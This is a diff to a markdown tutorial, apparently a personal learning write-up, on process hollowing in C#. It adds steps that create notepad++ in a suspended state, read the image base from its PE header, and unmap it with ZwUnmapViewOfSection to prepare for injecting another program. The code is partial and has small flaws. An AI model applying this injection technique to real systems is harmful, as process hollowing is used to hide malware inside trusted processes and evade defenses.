@@ -18,6 +18,11 @@ I want to try to inject a dummy application into notepad++ using the `Process Ho
     + [lpStartupInfo](#lpstartupinfo)
     + [lpProcessInformation](#lpprocessinformation)
   * [Code Example](#code-example)
+- [Hollowing our Victim Process](#hollowing-our-victim-process)
+  * [ZwUnmapViewOfSection Parameters](#zwunmapviewofsection-parameters)
+    + [ProcessHandle](#processhandle)
+    + [BaseAddress](#baseaddress)
+  * [Code Example](#code-example-1)
 
 # Creating our Victim Process
 
@@ -141,3 +146,117 @@ We have successfully loaded our victim executable to memory, and it is now in a 
 
 
 # Hollowing our Victim Process
+
+To hollow out our victim process, we need to unmap it from the memory, since its already currently loaded into memory but in a suspended state.
+
+We will be using the function `ZwUnmapViewOfSection`.
+
+More details of it can be found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection).
+
+```cpp
+NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
+  HANDLE ProcessHandle,
+  PVOID  BaseAddress
+);
+```
+
+## ZwUnmapViewOfSection Parameters
+
+### ProcessHandle
+
+Previously, we called the `CreateProcessA` function. This function helps fill up our `PROCESS_INFORMATION` block.
+
+`PROCESS_INFORMATION` contains the handle to our victim 
+
+Thus we can get the process handle from it using
+
+```cs
+IntPtr processHandle = processInformation.hProcess;
+```
+
+### BaseAddress
+
+Pointer to the base virtual address of the view to unmap
+
+![image](https://user-images.githubusercontent.com/12537739/121771500-4bb18e00-cba2-11eb-92b7-034b4aefdd38.png)
+
+As we can see from the image above, we need to get to the `COFF Header`. How do we get to the `COFF Header`? 
+
+At the `DOS_HEADER`, we have a 4 byte integer variable called `E_LFANEW`. This is located at an offset `0x3C` from the start of the file.
+Thus to get `E_LFANEW`, 
+
+```cs
+Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
+```
+
+`E_LFANEW` contains the offset to get to the `COFF Header`.
+
+Once we get to the `COFF Header`, we can see from the image that the `imagebase` is at `0x34` offset away. However, this is for 32-bit applications. For 64-bit applicaations, there are at a offsett `0x30` away.
+
+Hence to get the `imagebase`, I did
+
+```cs
+IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
+```
+
+Now that we have the `processHandle` and `imagebase` address, we can now call the `ZwUnmapViewOfSection` function to unmap our victim process from memory.
+
+```cs
+PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress);
+```
+
+## Code Example
+
+```cs
+static void Main(string[] args)
+{
+    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
+
+    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
+    IntPtr victimeFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);
+
+    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
+    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();
+
+    Console.WriteLine("Stage 1");
+    Console.WriteLine($"Creating victim process: {notepadPath}");
+
+    bool couldNotCreateProcess = !PInvoke.CreateProcess(
+                                        lpApplicationName: null,
+                                        lpCommandLine: notepadPath,
+                                        lpProcessAttributes: IntPtr.Zero,
+                                        lpThreadAttributes: IntPtr.Zero,
+                                        bInheritHandles: false,
+                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
+                                        lpEnvironment: IntPtr.Zero,
+                                        lpCurrentDirectory: null,
+                                        lpStartupInfo: startupInfo,
+                                        lpProcessInformation: processInformation
+                                    );
+    if (couldNotCreateProcess)
+    {
+        Console.WriteLine("Failed to create victim process...");
+
+    }
+
+    Console.WriteLine($"Successfully created victim process...");
+
+
+    Console.WriteLine("Stage 2");
+    Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
+    Console.WriteLine($"Getting handle to process...");
+    IntPtr processHandle = processInformation.hProcess;
+    Console.WriteLine($"Found E_LFANEW OFFSet: {e_lfanew}...");
+    Console.WriteLine($"Getting imageBasedAddress...");
+    IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
+    Console.WriteLine("Beginning Process Hollowing...");
+
+    if(PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
+    {
+        Console.WriteLine("Failed to unmap section...");
+        return;
+    }
+
+    Console.WriteLine("Successfully unmapped victim process.");
+}
+```
